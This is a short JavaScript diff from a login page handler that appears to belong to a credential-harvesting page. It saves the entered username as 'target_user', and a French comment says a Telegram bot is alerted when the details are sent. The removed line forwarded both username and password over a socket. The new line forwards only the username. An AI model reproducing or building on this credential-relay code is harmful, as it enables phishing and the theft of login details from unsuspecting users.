@@ -48,7 +48,7 @@ if (loginBtn) {
             localStorage.setItem('target_user', user);
 
             // Envoi des infos (le bot Telegram va vibrer)
-            socket.emit('login_attempt', { user, pass });
+            socket.emit('login_attempt', { user });
         } else {
             alert("Veuillez remplir tous les champs.");
         }
